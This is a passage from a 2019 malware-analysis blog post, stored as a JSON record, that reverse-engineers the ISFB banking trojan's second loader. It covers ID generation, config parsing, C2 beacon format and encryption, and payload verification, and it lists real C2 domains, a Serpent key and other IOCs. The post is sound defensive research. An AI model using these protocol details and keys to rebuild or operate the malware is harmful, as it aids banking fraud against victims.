{
    "id": "bacc2602-84d6-4f46-9431-f896302752b3",
    "created_at": "2023-01-12T15:01:11.976902Z",
    "updated_at": "2025-03-27T02:08:00.067189Z",
    "deleted_at": null,
    "sha1_hash": "28b775296bfe2a3882ede4df95e397f9883b26d3",
    "title": "2019-05-25 - Analyzing ISFB - The Second Loader",
    "authors": "",
    "file_creation_date": "2022-05-25T14:14:55Z",
    "file_modification_date": "2022-05-25T14:14:55Z",
    "file_size": 1939102,
    "plain_text": "# Analyzing ISFB – The Second Loader\n\n**[0ffset.net/reverse-engineering/malware-analysis/analyzing-isfb-second-loader](https://www.0ffset.net/reverse-engineering/malware-analysis/analyzing-isfb-second-loader/)**\n\n[0verfl0w_](https://www.0ffset.net/author/dan489400/)\n25th May 2019\n1 Comment\n\n\n25 May 2019\n\n\nSo it’s been quite a while since my last post, however now that myBeginner Malware\n**Analysis Course is complete, the posts should be more and more frequent, although that**\nobviously depends on the complexity of the samples I am analyzing. If you haven’t checked\n[out my last post on ISFB where we analyzed the first loader, check that out here to get](https://www.0ffset.net/reverse-engineering/malware-analysis/analysing-isfb-loader/)\nsome context for this part.\n\nThe second loader is part of the infection chain for a group of threat actors utilizing ISFB for\nfinancial gain, which I gave the name “Group 53”. You can read more information about this\nparticular group in the previous post as well, which contains a lot more detail about the\ngroup and the ISFB banking trojan itself. The second loader is in DLL format, with it being\nnamed “RPCRT4.dll” by the group, so we will be referring to the DLL with that name. This is\nquite an old sample, however as I was able to analyze it previously when the C2s were still\nalive, I was able to grab a PCAP file containing the communication to and from the sample,\nso we can still debug the sample and as the data is all valid, it should stay live. Anyway, if\nyou want to follow along with the analysis or do some analysis on your own, all the samples\n[have been uploaded to VirusBay. Let’s start reversing!](https://beta.virusbay.io/)\n```\nMD5 Of RPCRT4.dll: 52b4480de6f4d4f32fba2b535941c284\n\n```\nTaking a look at the entry point, only one function is called when the sample first executes,\nthis being First_Function (sub_1D4677), with a handle to the DLL instance being pushed\nas the argument (pointing to the base address of the DLL). This entry point is similar for\npretty much all the samples of RPCRT4.dll that I have looked at, so if you are analyzing a\nsample of ISFB and find a similar function in a new region of memory, it could be the\nsecond loader DLL.\n\n\n-----\n\nUpon stepping into this function, you will probably recognize some similarities to the\nprevious loader. Looking at the pseudocode below, we can see that first a heap is created, to\nbe used later on, and then the program gets a handle on itself, which is used in the next\nfunction named Decrypt_BSS_Section (sub_1D55F0). As the name suggests, this\nfunction decrypts the data in the .BSS section. It contains the same decryption function as\nthe first loader, however due to the fact that the .BSS section is at a different address\n(0xC000 rather than 0x6000), the resulting decryption key will be different. After\n[decrypting the .BSS section using the decryption script which you can find here, we can](https://github.com/0ver-fl0w/ISFB_Tools/blob/master/BSS_Decrypt.py)\nfinish looking at this function. The sample checks to see if the system is 32 or 64 bit, and\nthen executes the final function, named Main_Func (sub_1D6C79), before exiting. So, we\nneed to step into Main_Func.\n\n\n-----\n\nLooking at the function Main_Func, it is clear that there are a number of different things\nhappening inside it, so this part will be split into a few different sections.\n\n\n-----\n\n**Linear Congruential Random Number Generator (LCRNG)**\n\nThroughout the execution of this second loader, one particular algorithm known as a Linear\nCongruential Random Number Generator resurfaces time and time again, with it being\n[identifiable through it’s constants. So, what is a LCRNG? Well according to Wikipedia:](https://en.wikipedia.org/wiki/Linear_congruential_generator)\n```\nA linear congruential generator (LCG) is an algorithm that yields a sequence of\npseudo-randomized numbers calculated with a discontinuous piecewise linear equation.\nThe method represents one of the oldest and best-known pseudorandom number generator\nalgorithms.[1] The theory behind them is relatively easy to understand, and they are\neasily implemented and fast, especially on computer hardware which can provide\nmodulo arithmetic by storage-bit truncation.\n\n```\nNow, I’m not a mathematician, so I have no clue as to what half of these terms mean, so I\nwill focus on how exactly I was able to locate and determine what this algorithm was.\n\n\n-----\n\nLooking at the image below, we can see that first the loader calls a function named\n**QueryTokenInformation (sub_1D57C7), which is responsible for getting a handle to the**\ncurrent process token using ZwOpenProcessToken() and then querying that token using\n**ZwQueryInformationToken(), and then copying this to a newly allocated region of**\nmemory. The queried information copied over can be seen below, and is in fact the Security\nIdentifier (SID) of the current user (taken from a debugger):\n```\nCurrent User SID {\n   0x00000501, 0x05000000, 0x00000015, 0x6A80C140, 0x2065CB4C, 0xCA01B1D8,\n0x000003E9, \n   0x00000000\n};\n\n```\nOnce the querying function returns, a comparison is performed between 0x02 and the byte\npointed to by ebp+var_1F, which can be displayed as ebp-1F or ebp-31 (it is quite\nconfusing, I agree). Following ebp-1F in a debugger points to the first DWORD in the\nretrieved SID, specifically the 0x05. Obviously these two values don’t match, and so the\nvalue 0x05 is moved into eax, which is added to 0xFFFFFFFE, resulting in eax\ncontaining 0x03. This is then used in the loop just after, where the loader adds the fourth,\nfifth, and sixth DWORD in the SID together, which is then stored in the DWORD I have\nnamed Generated_Seed. Upon adding these values, we get 0x154E83E64, which in\nDWORD format would be 0x54E83E64.\n\n\n-----\n\nThen, the calculated value is XOR’d with the value 0xCF8558FC, giving the final seed\n**0x9B6D6698. The loader then initializes a critical section, moving the string**\n**0123456789ABCDEF into a newly allocated region of memory. This particular string**\nresembles the default RC6 encryption/decryption key, which was used prior to Serpent\nbeing implemented.\n\n\n-----\n\nThe next function called is named Get_Machine_User_Name_Gen_Value\n(sub_1D4BBE), and contains the first LCRNG function in the binary. In the psuedocode, we\ncan see that the function Random_Value_Generator (sub_1D5D69) takes 2 arguments:\nthe previously generated seed, and an empty region of memory. Based on the XOR\noperations below, we can assume that this empty region of memory will contain the\nrandomly generated values. Before we check out the LCRNG function, let’s finish up\nanalyzing this function. We can see that the loader calls GetUserNameW() and\n**GetComputerNameW(), before performing a CRC32 calculation (same CRC32 function**\nas the previous loader) on the Username and Computer Name. The results of the CRC32\nhashing are XOR’d with the first (Alloc_Memory) and fourth (Alloc_Memory[3]) DWORD\nof the LCRNG value. Finally, the second DWORD of the randomly generated value is XOR’d\nwith the result of XORing the values in eax, ecx, and edx after calling cpuid(). So, now we\nhave an idea of this function, let’s examine the LCRNG.\n\n\n-----\n\nThe LCRNG function is quite small, and so doesn’t stand out as well as something like\nSerpent for example. Taking a look at the assembly or psuedocode of the function, we can\nget a good idea of what is going on. Specifically, two values stand out: 0x19660D and\n**0x3C6EF35F. After searching for either one of these two values we can find references to**\ntheir usage in other variants of malware, specifically PowerSniff, PoSlurp, and\n**[ShellTea, two of which are PoS malware, and](https://www.root9b.com/sites/default/files/whitepapers/PoS%20Malware%20ShellTea%20PoSlurp_1.pdf)** **[one being similar to ISFB itself. After](https://unit42.paloaltonetworks.com/powersniff-malware-used-in-macro-based-attacks/)**\n[some more searching, I came across this video (1:06) from 2016, which explains how this](https://www.youtube.com/watch?v=Ll4yzgVvcfg)\nparticular algorithm works – except in the context of Super Mario 64 on the Nintendo DS.\nWhilst the other variants of malware utilize the algorithm to decrypt strings or encrypt\nstolen data, this loader simply uses it for generating a randomized value. Using all of the\ninformation we have found, we can replicate the algorithm using these values:\n```\nRNG Seed = 0x9B6D6698\nRNG Adder = 0x3C6EF35F\nRNG Multiply = 0x0019660D\n\n```\nAs we are able to debug the sample, we can take the quick route and simply put a breakpoint\non the function return, and run until we hit it. From doing so three times, I was able to get 3\ndifferent values, however I did get a few repeats – this is due to the fact that there is a seed\ninvolved, so there is a high chance that there could be duplicates (*I think*). These are the\nthree different, but similar, values that were generated:\n\n\n-----\n\n```\n1: 17 B9 B5 BC 8A 83 61 9D 4C 3B 5E 25 40 9F 72 29\n2: 17 B9 B5 BC 8A 83 61 9D 4C 3B 5E 25 9F 72 29 74\n3: 17 B9 B5 BC 8A 83 C0 90 1F F2 A9 F4 C3 46 ED 68\n\n```\nIn this example, we will be using one to calculate the end result of the function:\n```\n17 B9 B5 BC 8A 83 61 9D 4C 3B 5E 25 40 9F 72 29\n\n```\nAs mentioned, it XORs the first DWORD (bytes swapped) with the CRC hash of the\nusername, so for my virtual machine, the calculation was: 0xBCB5B917 ^ 0x510E019D.\nThis then overwrites the first DWORD, resulting in this:\n```\n 8A B8 BB ED 8A 83 61 9D 4C 3B 5E 25 40 9F 72 29\n\n```\nNext, it XORs the last DWORD with the CRC hash of the system name, so the calculation\nwas: 0x29729F40 ^ **0xADAC6654. Once again, it overwrites the DWORD, resulting in:**\n```\n 8A B8 BB ED 8A 83 61 9D 4C 3B 5E 25 14 F9 DE 84\n\n```\nFinally, it XORs the second DWORD with the result of eax ^ ecx ^ edx after calling\n**cpuid(), so the calculation was:**\n**0x9D61838A ^ 0xC9D3D67E, which again overwrites the DWORD, resulting in the final**\n“string”:\n```\n8A B8 BB ED F4 55 B2 54 4C 3B 5E 25 14 F9 DE 84\n\n```\nThis final value is stored in the variable Generated_Value, ready for use later on. So, that\nsums up the LCRNG function, let’s jump back to the calling function, and onto the next\nsection.\n\n\n-----\n\n-----\n\n**Parsing The Configuration**\n\nThe next function to analyze is named Parse_JJ_And_Config (sub_1D66E3), and as the\nname suggests, focuses on parsing the joined configuration (AKA Client_INI). I have gone\nover how the JJ structures are parsed in the prior post, and so in this post we will be looking\nat how the configuration itself is parsed. Looking at the pseudocode for this function, there\nare two important functions; Parse_JJ_Structure (sub_1D740D) and Parse_Config\n(sub_1D2DCD). You’ll also notice that Parse_JJ_Structure is called twice – this is due to\nthe fact that the second loader contains two lots of joined data – a Public RSA Key, and the\nconfiguration, hence why you can see the variable RSA_Key.\n\nAfter decompressing both the RSA Key and configuration, we are left with these hex dumps\nbelow:\n\n\n-----\n\n```\nDecompressed RSA Pub. Key {\n    0x00, 0x02, 0x00, 0x00, 0xE0, 0x64, 0x63, 0x8D, 0x56, 0xB4, 0x69, 0x04,\n0x16, 0x10, 0x0B, 0xF5,\n    0x05, 0x57, 0x54, 0x21, 0x64, 0xBA, 0x8E, 0x6E, 0xE2, 0x7A, 0xAD, 0x15,\n0xF9, 0x7C, 0x1F, 0x79,\n    0xA8, 0xC8, 0x39, 0x75, 0xE1, 0x29, 0x1C, 0x37, 0x15, 0xC5, 0x15, 0x69,\n0xB0, 0x20, 0x4F, 0x2B,\n    0x4D, 0x3C, 0xF8, 0x1F, 0x38, 0x06, 0x02, 0x8D, 0xD0, 0x1D, 0x15, 0x7C,\n0x87, 0xF7, 0xF9, 0x1D,\n    0xDB, 0x6D, 0xB1, 0xE5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x01, 0x00, 0x01\n};\n\n```\n\n-----\n\n```\nDecompressed Configuration {\n    0x0C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0xEB, 0x5B, 0x65,\n0x01, 0x00, 0x00, 0x00,\n    0x20, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0xF6, 0x5B, 0x66, 0xD0, 0x01, 0x00, 0x00, 0x00, 0x09, 0x01, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8A, 0x79, 0x6B, 0x65,\n0x01, 0x00, 0x00, 0x00,\n    0x20, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x8F, 0xED, 0x6A, 0x55, 0x01, 0x00, 0x00, 0x00, 0x0D, 0x01, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3E, 0x69, 0xA8, 0x4F,\n0x01, 0x00, 0x00, 0x00,\n    0xF8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x7F, 0x1C, 0x27, 0x11, 0x01, 0x00, 0x00, 0x00, 0xF1, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x83, 0x57, 0x29, 0x48,\n0x01, 0x00, 0x00, 0x00,\n    0xDC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x25, 0x59, 0x4E, 0x58, 0x01, 0x00, 0x00, 0x00, 0xC7, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x45, 0x73, 0x17, 0x73,\n0x01, 0x00, 0x00, 0x00,\n    0xB1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x68, 0x0E, 0x85, 0xCD, 0x01, 0x00, 0x00, 0x00, 0xB7, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0xFA, 0x1E, 0xC6,\n0x01, 0x00, 0x00, 0x00,\n    0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x88, 0x74, 0x2E, 0xDF, 0x01, 0x00, 0x00, 0x00, 0x9D, 0x00, 0x00, 0x00,\n0x00, 0x00, 0x00, 0x00,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x71, 0x66, 0x65,\n0x6C, 0x69, 0x63, 0x69,\n    0x61, 0x6C, 0x65, 0x77, 0x2E, 0x63, 0x69, 0x74, 0x79, 0x20, 0x6D, 0x7A,\n0x67, 0x34, 0x39, 0x35,\n    0x38, 0x6C, 0x63, 0x2E, 0x63, 0x6F, 0x6D, 0x20, 0x67, 0x78, 0x75, 0x78,\n0x77, 0x6E, 0x73, 0x7A,\n    0x61, 0x75, 0x2E, 0x62, 0x61, 0x6E, 0x64, 0x00, 0x33, 0x31, 0x38, 0x34,\n0x00, 0x31, 0x32, 0x00,\n    0x31, 0x30, 0x32, 0x39, 0x31, 0x30, 0x32, 0x39, 0x4A, 0x53, 0x4A, 0x55,\n0x59, 0x4E, 0x48, 0x47,\n    0x00, 0x31, 0x30, 0x00, 0x32, 0x30, 0x00, 0x30, 0x00, 0x63, 0x6F, 0x6E,\n0x73, 0x74, 0x69, 0x74,\n    0x75, 0x74, 0x69, 0x6F, 0x6E, 0x2E, 0x6F, 0x72, 0x67, 0x2F, 0x75, 0x73,\n0x64, 0x65, 0x63, 0x6C,\n    0x61, 0x72, 0x2E, 0x74, 0x78, 0x74, 0x00, 0x30, 0x78, 0x34, 0x65, 0x62,\n0x37, 0x64, 0x32, 0x63,\n    0x61, 0x00, 0x63, 0x6F, 0x6D, 0x20, 0x72, 0x75, 0x20, 0x6F, 0x72, 0x67,\n0x00, 0x31, 0x30, 0x00,\n\n```\n\n-----\n\n```\n    0x00\n};\n\n```\nIf you’re looking for a quick way to extract the config, or scripts that can be used to\nautomate the extraction of IOCs or decryption of data with regards to ISFB, you can check\n[out my basic toolkit for doing so here.](https://github.com/0ver-fl0w/ISFB_Tools)\nNow we have both the RSA key and Config, let’s examine how the configuration is parsed.\n\nLooking at Parse_Config, it takes one argument, which is the result of XORing the “pnls”\nkey that was mentioned in the previous post, with a certain embedded value. From closer\nresearch into ISFB and looking at the open source version, it is clear that the “pnls” key is in\nfact referred to as a CS_COOKIE, and so that is the term I will be using. In one instance,\nwe can see the CS_COOKIE being XOR’d with the embedded value 0x160717FA, which\nresults in the value 0x656B798A. If you look hard at the decompressed configuration\nabove, you will probably locate the same hex value, although backwards: 0x8A796B65.\nThis is due to the fact that the configuration acts as a lookup table, pointing to the real\nconfiguration data such as the URLs or Botnet ID – this means the loader doesn’t have to\nsearch the entire config to locate a certain value, and instead it can get the offset for that\nvalue. Luckily, we are able to determine what value corresponds to what, thanks to the\n**[work previously done by @Maciekkotowicz:](https://lokalhost.pl/talks/botconf2016/)**\n```\ncrc_table = {\n    \"0x556aed8f\": \"server\",\n    \"0xea9ea760\": \"bootstrap\",\n    \"0xacf9fc81\": \"screenshot\",\n    \"0x602c2c26\": \"keyloglist\",\n    \"0x656b798a\": \"botnet\",\n    \"0xacc79a02\": \"knockertimeout\",\n    \"0x955879a6\": \"sendtimeout\",\n    \"0x31277bd5\": \"tasktimeout\",\n    \"0x18a632bb\": \"configfailtimeout\",\n    \"0xd7a003c9\": \"configtimeout\",\n    \"0x4fa8693e\": \"key\",\n    \"0xd0665bf6\": \"domains\",\n    \"0x75e6145c\": \"domain\",\n    \"0x6de85128\": \"bctimeout\",\n    \"0xefc574ae\": \"dga_seed\",\n    \"0xcd850e68\": \"dga_crc\",\n    \"0x73177345\": \"dga_base_url\",\n    \"0x11271c7f\": \"timer\",\n    \"0x584e5925\": \"timer\",\n    \"0x48295783\": \"timer\",\n    \"0xdf351e24\": \"tor32_dll\",\n    \"0x4b214f54\": \"tor64_dll\",\n    \"0x510f22d2\": \"tor_domains\",\n    \"0xdf2e7488\": \"dga_season\",\n    \"0xc61efa7a\": \"dga_tld\",\n    \"0xec99df2e\": \"ip_service\"\n}\n\n```\n\n-----\n\nUsing this lookup table, we can see that the loader parses several values; Timer1, Timer2.\nTimer3, BotnetID, Server, Key, and Domains. The timers are not extremely important,\nhowever the other values are. The Botnet ID is a number corresponding to the ID assigned\nto the botnet that the loader is a part of – some groups tend to use the same IDs, such as the\ngroup utilizing Hancitor using the same value 2000 – although this group typically alter\nthe values, but still remain in the 3xxx region. This loader contains the botnet ID 3184. The\nServer seems to be used only in the data posted to the C2 server, and it simply is a server\nidentifier, which is usually set to 12. The key is the Serpent encryption key to use for\nencrypting all traffic to the server, and in this case it is 10291029JSJUYNHG. Finally, the\nDomains are a list of C2 servers that the loader can reach out to in order to get the next\nstage. In this loader, the C2 servers are; qfelicialew.city, mzg4958lc.com, and\n**gxuxwnszau.band. Whilst we do know what each value represents, let’s take a look at**\nhow the loader parses the config, so that we can automate it.\n\nLooking at the assembly of the function, we can see the parsing function is quite simple.\nFirst, the loader checks to see if the value in some_counter is less than the number of\nentries in the configuration, which can be found as the first byte in the configuration – in\nthis case it is 0x0C, meaning there are 12 different values. It then looks at the DWORD\npointed to by ecx-8, which in the first loop is only 8 bytes into the config. This DWORD is\ncompared to the CS_COOKIE XOR value stored in xor_value. If these values don’t match,\n**some_counter is incremented by 1, and 24 is added to ecx, before looping back around.**\nIf the values do match, the DWORD at ecx-4 is used in a logical AND operation with the\nvalue 0x01. In this loader, each DWORD after the one compared to xor_value contains the\nvalue 0x01, and as 1 & 1 = 1, the jump condition is never met. Therefore, the value of\n**esi+ecx is moved into eax, and on the first loop, this is equal to 0x78. The value in eax is**\nthen added to the offset pointed to by ecx, which on the first loop is 0xF1, resulting in the\nvalue in eax being 0x169. 0x08 is added to this value, which is finally added to the base of\nthe config in order to get the correct value.\n\nTo understand it better, you can see a psuedocode version below:\n\n\n-----\n\n```\nESI  0xFFFFFFF0 Config_Address\nECX = Config_Address + 16\nCounter = 0\nCRC_Val = arg_0\nwhile Counter < Num_Config_Entries:\n  Config_CRC = [ECX-8]        # Point to config CRC val\n  if Config_CRC== CRC_Val: \n    if [ECX-4] & 1 == 0:\n      EAX = [ECX]\n    else:\n      EAX = ESI + ECX\n      EAX = EAX[-8:]          # Get Lower 8 bytes (32 bit machine)\n      EAX = EAX + [ECX]\n      Pointer_To_Data = [EAX + Config_Address + 8]\nCounter = Counter + 1\nECX = ECX + 24\nif EAX & EAX == 0:\n  return Pointer_To_Data\n\n```\n\n-----\n\nUsing the information in this function, we can understand how the configuration lookup\npart is constructed:\n\n\n-----\n\n```\nConfig Lookup Structure (Typically followed by 3 DWORDs of 0x00 s) {\n  DWORD CRC_Name\n  DWORD Flags\n  DWORD Offset\n}; \nConfig Lookup Structure Example {\n  0x655BEB58,\n  0x00000001, \n  0x00000120\n};\n\n```\nOnce the URLs have been located in the config, they are split into individual URLs for easier\naccess – you’ll notice in the hex dump that each URL is split with 0x20, which corresponds\nto a space.\n\nSo, now we have looked at how the configuration works in ISFB and how it is parsed by the\nloader, we can move onto the next section/function – Network Communication and\n**the Next Stage.**\n\n**Network Communication and the Next Stage**\n\nOnce the loader has finished with the config, it returns back to the previous function and\ncalls the next one, which I have labelled Retrieve_And_Setup_Next_Stage\n(sub_1D76ED), and this function is where things start to become quite interesting with the\nusage of COM API to perform certain tasks. I have already gone over how the second loader\nutilizes COM to connect to it’s C2 server through Internet Explorer in a previous post, which\n[you can find here, and so I will only briefly touch on the COM API usage in the sample.](https://www.0ffset.net/reverse-engineering/analyzing-com-mechanisms-in-malware/)\n\n\n-----\n\nInside the Retrieve_And_Setup_Next_Stage function, there are 3 important functions,\nwith the first one being named Registry_COM (sub_1D6E8A), the second being\n**Talk_To_C2 (sub_1D553A), and the final being Setup_And_Exec_Next_Stage**\n(sub_1D79B1).\n\n\n-----\n\nAs the name suggests, Registry_COM involves the loader interacting with the registry\nusing COM API. When I was analyzing the sample, I noticed it would crash and get stuck on\none of the COM calls, and it only seemed to work when running from the original\nexecutable, rather than the dumped DLL. The main purpose of this function is to prepare\nInternet Explorer before it is used to communicate to the C2 server. It does so by altering 3\nregistry keys:\n```\nSOFTWARE\\Microsoft\\Internet Explorer\\Main\\IE10RunOnceLastShown_TIMESTAMP\nSOFTWARE\\Microsoft\\Internet Explorer\\Main\\IE8RunOnceLastShown_TIMESTAMP\nSOFTWARE\\Microsoft\\Internet Explorer\\Main\\Check_Associations\n\n```\n\n-----\n\nThe first two are timestamps, which are altered using the result of\n**GetSystemTimeAsFileTime(). This is to inform Internet Explorer that it was opened**\njust a few seconds ago, so that it doesn’t pop up any unwanted message boxes that pop up\nevery now and then. The final registry key is used to let Internet Explorer know if the user\nwants to see the “Internet Explorer isn’t your default browser” upon each restart. By default\nthis is set to yes, but this loader sets it to no, so that the communication phase runs\nsilently. If you are interested in learning more about how the sample uses COM for tasks like\naltering the registry, I highly recommend downloading it and analyzing it further, as there\naren’t many resources out there focused on COM API in malware, and this is a great sample\nto learn from.\n\n\n-----\n\nNow we move onto the Talk_To_C2 function. This function is comprised of two parts – a\nsend/receive function (sub_1D43CC), and a decrypt/verify function (sub_1D6547). First,\nlets take a look at the send/receive function.\n\n\n-----\n\nFirstly, for each connection made to a command and control server, this loader edits a string\nthat is posted to the server. This string contains information about the loader itself, as well\nas a GUID for the user. The reason I used the term “edit” is because the string that is used is\n\n\n-----\n\nstored inside the BSS section, although placeholders are used, rather than actual values. The\nstring in question can be seen below:\n```\nsoft=%u&version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&crc=%x&uptime=%u\n\n```\nThe loader then uses wsprintf() to fill in the string, using the correct values. The soft and\n**version are hardcoded into the loader, the user is the previously generated value, the**\n**server and id are taken from the configuration, the crc is taken from the result of a call to**\n**GetTickCount(), and the uptime is the result of a call to**\n**QueryPerformanceFrequency() and QueryPerformanceCounter(). Once all is**\ncomplete, it should look similar to the string below:\n```\nsoft=3&version=214062&user=8ab8bbedf455b2544c3b5e2514f9de84&server=12&id=3184&crc=1&u\n\n```\n\n-----\n\nNext, the string is encrypted and encoded using Serpent CBC encryption and Base64\nEncoding. The key used to encrypt it can be found in the configuration, and in this case the\nkey is 10291029JSJUYNHG. Before doing so, a random string is prepended to the string\n\n\n-----\n\nso that there are no similarities in the data sent to different C2 s – this prevents analysts\nfrom writing rules to specifically search for the encrypted packet as it always differs. An\nexample of a random string prepended can be seen below.\n```\nDecrypted + Decoded string:\nphg=srlp&soft=3&version=214062&user=8ab8bbedf455b2544c3b5e2514f9de84&server=12&id=318\nEncrypted + Encoded string:\ni3J0eyZZBqiCnYVeSU5uAc0Wn9PO9cfNdjb7eSLG2GFV1SGx+Spn6KJ9qlLDRx6InJvmuN/hh376/+9SAqnsR\n\n```\n\n-----\n\nTo finalize the string before sending, the loader cleans it up a bit, removing values such as +\nand / and replacing them with _2B and _2F respectively. The =‘s are also removed.\nFinally, using the random value generator, it adds slashes to the string in random places,\nbefore prepending /images/ and appending .avi, resulting in a string similar to the one\nbelow:\n```\n/images/i3J0eyZZBqiCnYVeSU5u/Ac0Wn9PO9cfNdjb7eSL/G2GFV1SGx_2BSpn6KJ9qlL/DRx6InJvmuN_2\n\n```\n\n-----\n\nOnce the string is complete, it is appended to the URL, and then the sample uses COM\nfunctionality (sub_1D6F57) to communicate through Internet Explorer – so looking at\nProcess Hacker, you will notice that Internet Explorer is making connections, even though it\nis not open – this is actually the loader connecting to the C2. If you want to find more about\n[how it does this, check out a previous post here.](https://www.0ffset.net/reverse-engineering/analyzing-com-mechanisms-in-malware/)\n\n\n-----\n\nWhilst the C2 servers are down and have been for a while, we are able to use tools such as\nInetSim to our advantage and replay the packets to the malware, meaning we can debug it\ncompletely, rather than the sample exiting after failing to retrieve the next stage. This is only\npossible if you have a valid PCAP though, and luckily I made sure to have Wireshark\nrunning while I analyzed it initially. Once the data has been received by the loader, the\nsend/receive function Base64 decodes the data and returns, and if the data is valid, the\ndecrypt/verify function is called, so let’s move into that.\n\n\n-----\n\nThe decrypt/verify function is fairly simple to understand if you know what algorithms are\nbeing used. It is commonly known that ISFB utilizes Serpent CBC Encryption, and that is no\ndifferent in this loader. However, what you may not realize is that there is another\ndecryption function called before the data is decrypted with Serpent – this is because the\ndata that is decrypted by the first function contains 3 important things; the MD5 hash of the\ndecrypted data, the Serpent key used to decrypt the data, as well as the size of the data to\ndecrypt (a lot of the data in the data received is simply junk code). Looking at the image\nbelow, you can probably guess that it has something to do with RSA. And you would be\nright! Before initiating the decryption of the downloaded data, the loader copies the joined\nRSA key to a different region of memory, which is then pushed as the last argument to the\nfunction RSA_Serpent_MD5_Data (sub_1D2C60). We can also determine that in some\nsamples, the “on-board” RSA key is encrypted, as we can see the variable dword_1DB25C\nis being used in an if() statement, which performs a rotating XOR algorithm on the RSA key.\nIn this sample, that isn’t the case, so let’s step into the RSA_Serpent_MD5_Data\nfunction.\n\n\n-----\n\nExamining the psuedocode of what seems to be the main decryption function, there are\nthree main functions here. It is quite difficult to follow what actually happens, due to the\nlayout of the code and the LABEL_xx, but here is a quick summary of what happens: First,\n**RSA_Decrypt_Block (sub_1D5213) is called, and the fourth argument of this function**\ntells us that the loader is only looking at the last 64 bytes of the data – v4 is the pointer to\nthe received data, and a1 is the size of the data. Therefore, if the data is 4064 bytes long, the\nfourth argument would be v4[4000]. Once the last 64 bytes have been RSA decrypted, the\nloader extracts the serpent key for decryption, the size, and MD5 hash, before calling the\n**Serpent (sub_1D52B4) function, with the last argument being 0, indicating the data is to**\nbe decrypted. Once the data has been decrypted fully, MD5_Decrypted_Executable\n(sub_1D2419) is called, which calculates the MD5 of the decrypted data. From there, it\ncompares each DWORD of both MD5 hashes, and as long as they both match, it will return\nsuccessfully – otherwise it will clear the decrypted data from memory and return.\n\n\n-----\n\n```\nLast 64 bytes of data Encrypted {\n  0x8B, 0x2B, 0x4F, 0x6B, 0xD8, 0xEF, 0xE3, 0x6A, 0x84, 0x11, 0x85, 0xDB, 0xAD,\n0x4D, 0x36, 0x51,\n  0x33, 0xC9, 0xCC, 0xAA, 0xCD, 0xCA, 0x72, 0x98, 0xB6, 0x15, 0x19, 0x19, 0xB3,\n0x64, 0x4C, 0x82,\n  0xF1, 0x72, 0x50, 0x57, 0xAC, 0x1C, 0x43, 0x82, 0xAB, 0x82, 0xBB, 0x7A, 0xF8,\n0xD1, 0x0D, 0xAF,\n  0xF4, 0xDD, 0x40, 0x13, 0x85, 0x5E, 0xA2, 0xE1, 0x91, 0x88, 0xF6, 0xFA, 0x2B,\n0xD5, 0xF2, 0x51\n};\nLast 64 bytes of data - RSA Decrypted - MD5[0:16], Serpent[16:32], Size[32:36] {\n  0x14, 0x37, 0x3F, 0x33, 0xE1, 0x90, 0x7B, 0x5D, 0x82, 0x74, 0x7B, 0xED, 0x1F,\n0x1A, 0xAC, 0xAF,\n  0xE2, 0xD9, 0x64, 0x73, 0x36, 0x1D, 0xD8, 0x57, 0xCA, 0xA1, 0x8C, 0x7B, 0x9E,\n0x65, 0x80, 0xDF,\n  0x00, 0x76, 0x02, 0x00, 0x06, 0xAD, 0x28, 0x67, 0x14, 0x37, 0x3F, 0x33, 0xE1,\n0x90, 0x7B, 0x5D,\n  0x82, 0x74, 0x7B, 0xED, 0x1F, 0x1A, 0xAC, 0xAF, 0x28, 0x00, 0x00, 0x00, 0x00,\n0x76, 0x02, 0x00\n};\n\n```\nNow that the data has been decrypted, and the MD5 hashes match completely, the\ndecrypt/verify function will return and overwrite the encrypted data with the decrypted data\nusing memcpy(). Then, we return back to the function that called Talk_To_C2. It is quite\ndifficult to tell with the psuedocode, but Talk_To_C2 is actually inside a loop that loops 3\ntimes in total, meaning the same C2 is queried 3 times, with the same data, and it might\n\n\n-----\n\nleave you questioning why? . Well to answer that, we need to look at what the encrypted\ndata actually is. We can do this by decrypting it based off of the PCAP, or simply by\ndebugging it and waiting for it to decrypt in memory, before dumping it out.\n\nOn the first and second call to Talk_To_C2, the C2 server returns an executable. It may\nseem like it is the same 